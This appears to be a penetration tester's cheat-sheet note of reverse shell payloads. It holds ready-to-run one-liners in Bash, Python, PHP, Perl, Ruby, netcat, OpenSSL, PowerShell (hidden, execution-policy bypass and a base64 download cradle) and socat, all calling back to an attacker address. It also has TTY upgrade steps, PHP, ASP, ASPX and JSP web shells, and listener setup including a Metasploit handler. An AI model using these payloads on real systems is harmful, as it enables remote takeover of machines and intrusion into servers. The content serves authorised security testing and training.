# Reverse Shell Compendium

## Table of Contents
- [[#Check Available Tools|Check Available Tools]]
- [[#Bash Reverse Shell|Bash Reverse Shell]]
- [[#Python Reverse Shells|Python Reverse Shells]]
- [[#PHP Reverse Shell|PHP Reverse Shell]]
- [[#Perl Reverse Shell|Perl Reverse Shell]]
- [[#Ruby Reverse Shell|Ruby Reverse Shell]]
- [[#Netcat Reverse Shells|Netcat Reverse Shells]]
- [[#OpenSSL Encrypted Reverse Shell|OpenSSL Encrypted Reverse Shell]]
- [[#PowerShell Reverse Shell|PowerShell Reverse Shell]]
- [[#Socat Reverse Shell|Socat Reverse Shell]]
- [[#TTY Upgrade Methods|TTY Upgrade Methods]]
- [[#MSFVenom Payload Generation|MSFVenom Payload Generation]]
- [[#Web Shells|Web Shells]]
- [[#Related Notes|Related Notes]]

---

## Check Available Tools

Before attempting a reverse shell, check what's available on the target:

```bash
which bash python python3 perl nc ncat socat ruby php openssl
which bash; which python; which python3; which perl; which nc; which ncat; which socat; which ruby; which php; which openssl
```

Also check:
```bash
# BusyBox (common on embedded/IoT)
busybox --help

# Check for statically compiled tools
ls /bin/ /usr/bin/ 2>/dev/null | grep -E 'nc|ncat|socat|python|perl'
```

---

## Bash Reverse Shell

The classic Bash reverse shell — works on most Linux targets:

```bash
bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
```

**Breakdown:**
- `bash -i` — interactive shell
- `>& /dev/tcp/LHOST/LPORT` — redirect stdout and stderr to the TCP connection
- `0>&1` — redirect stdin to stdout (which is the TCP connection)

**Alternative syntax (more compatible):**

```bash
exec 5<>/dev/tcp/10.10.14.3/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

Or:
```bash
0<&196;exec 196<>/dev/tcp/10.10.14.3/4444; sh <&196 >&196 2>&196
```

> [!warning]
> Bash reverse shells rely on `/dev/tcp` — a special feature compiled into `bash` itself, not a device file. It works in `bash` but not `sh`, `dash`, or `zsh`.

---

## Python Reverse Shells

### Python3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Shortened version:**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.3",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
```

### Python2

```bash
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'
```

### Python One-liner (PTY-enabled)

```bash
python3 -c 'import pty,subprocess,os,socket;s=socket.socket();s.connect(("10.10.14.3",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

> [!tip]
> The PTY-enabled version gives you a pseudo-terminal, which helps with interactive commands (su, sudo, vi, etc.).

---

## PHP Reverse Shell

### One-liner

```bash
php -r '$sock=fsockopen("10.10.14.3",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### One-liner (alternative with shell_exec)

```bash
php -r 'exec("/bin/bash -i >& /dev/tcp/10.10.14.3/4444 0>&1");'
```

### PentestMonkey PHP Reverse Shell (full script)

Save as `shell.php`:

```php
<?php
set_time_limit(0);
$ip = '10.10.14.3';
$port = 4444;
$sock = fsockopen($ip, $port);
$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
proc_close($process);
?>
```

---

## Perl Reverse Shell

### Short one-liner

```bash
perl -e 'use Socket;$i="10.10.14.3";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Full Perl reverse shell

```bash
perl -MIO -e '
$ip="10.10.14.3";
$port=4444;
$remote=IO::Socket::INET->new(
    Proto=>"tcp",
    PeerAddr=>$ip,
    PeerPort=>$port
);
unless($remote){print"Cannot connect\n";exit}
STDIN->fdopen($remote,"r");
STDOUT->fdopen($remote,"w");
STDERR->fdopen($remote,"w");
system("sh -i");
'
```

---

## Ruby Reverse Shell

### Short one-liner

```bash
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.3",4444))'
```

### Full Ruby reverse shell

```bash
ruby -e '
require "socket"
exit if fork
c=TCPSocket.new("10.10.14.3","4444")
while(cmd=c.gets)
  IO.popen(cmd,"r"){|io|c.print io.read}
end
'
```

### Ruby one-liner (alternative)

```bash
ruby -rsocket -e 'f=TCPSocket.open("10.10.14.3",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## Netcat Reverse Shells

### With `-e` flag (traditional netcat / ncat)

```bash
nc -e /bin/bash 10.10.14.3 4444
nc -e /bin/sh 10.10.14.3 4444
```

### Without `-e` flag (OpenBSD netcat — mkfifo method)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.3 4444 > /tmp/f
```

### Netcat with mknod

```bash
mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | nc 10.10.14.3 4444 1>/tmp/backpipe
```

> [!tip]
> Use `which nc` or `nc -h` to see if you have GNU netcat (`-e` flag) or OpenBSD netcat (no `-e`). On Kali: `apt install netcat-traditional` for `-e` support.

---

## OpenSSL Encrypted Reverse Shell

### Step 1: Create self-signed certificate on attacker

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

### Step 2: Start listener on attacker

```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

### Step 3: Reverse shell from target

```bash
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.3:4444 > /tmp/s; rm /tmp/s
```

### Ncat with SSL (easier)

```bash
# On attacker (listener with SSL)
ncat -lvnp 4444 --ssl

# On target
ncat -e /bin/bash 10.10.14.3 4444 --ssl
```

---

## PowerShell Reverse Shell

### Full one-liner

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shortened PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell Base64 Encoded

Encode to avoid syntax issues:

```bash
# Generate the base64 payload
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.3/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
```

Then execute:
```powershell
powershell -Enc <BASE64>
```

### PowerShell 3-liner (easier to modify)

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

---

## Socat Reverse Shell

### Listener (attacker)

```bash
socat -dd -T 60 TCP-LISTEN:4444 STDOUT
```

### Target connection (Linux)

```bash
socat TCP4:10.10.14.3:4444 EXEC:/bin/bash
```

### TTY-enabled socat listener (attacker)

```bash
socat -dd -T 60 TCP-LISTEN:4444 PTY,raw,echo=0
```

### Target connection with TTY (Linux)

```bash
socat TCP4:10.10.14.3:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Socat for Windows

```bash
# Download socat for Windows first, then:
socat TCP4:10.10.14.3:4444 EXEC:'cmd.exe',pty,stderr,setsid,sigint,sane
```

---

## TTY Upgrade Methods

After catching a reverse shell, upgrade to a full interactive TTY.

### Method 1: Python PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Method 2: STTY (full TTY upgrade)

Step 1 — In the reverse shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z  # Background the shell
```

Step 2 — On attacker (your terminal):
```bash
stty -a | head -n 1  # Note rows and columns
stty raw -echo; fg
```

Step 3 — Back in the reverse shell:
```bash
reset
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 50 columns 180
```

### Method 3: Script

```bash
script /dev/null -c /bin/bash
# Then Ctrl+D to exit
```

### Method 4: Socat

```bash
# Attacker (listener with TTY)
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.3:4444
```

### Method 5: Expect

```bash
expect -c 'spawn /bin/bash; interact'
```

### Method 6: AWK

```bash
awk 'BEGIN {system("/bin/bash")}'
```

### Method 7: Easy stty background method

```text
1. Ctrl+Z to background shell
2. stty raw -echo; fg
3. export TERM=xterm
4. Press Enter twice
```

---

## Web Shells

### PHP Web Shell

```php
<?php system($_GET['cmd']); ?>
```

```php
<?php passthru($_REQUEST['cmd']); ?>
```

```php
<?php exec($_GET['cmd'], $output); print_r($output); ?>
```

### ASP Web Shell

```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptExec = oScript.Exec("cmd.exe /c " & Request.QueryString("cmd"))
Response.Write(oScriptExec.StdOut.ReadAll())
%>
```

### ASPX Web Shell

```aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    Response.Write(stmrdr.ReadToEnd());
}
</script>
```

### JSP Web Shell

```jsp
<%
Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
```

---

## Listener Setup

### Netcat listener (basic)

```bash
nc -lvnp 4444
```

### Ncat listener (with SSL)

```bash
ncat -lvnp 4444 --ssl
```

### Socat listener (TTY enabled)

```bash
socat -dd -T 60 TCP-LISTEN:4444 PTY,raw,echo=0
```

### Multi-handler (Metasploit)

```bash
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4444
run
```

---

## Related Notes

- [[06 - Shells and Payloads/6.4 Payload Generation/MSFVenom Reference]]
- [[06 - Shells and Payloads/6.5 File Transfers/File Transfer Techniques]]
- [[07 - Metasploit Framework/Metasploit Complete]]
- [[02 - Active Directory/AD Attack Paths]]
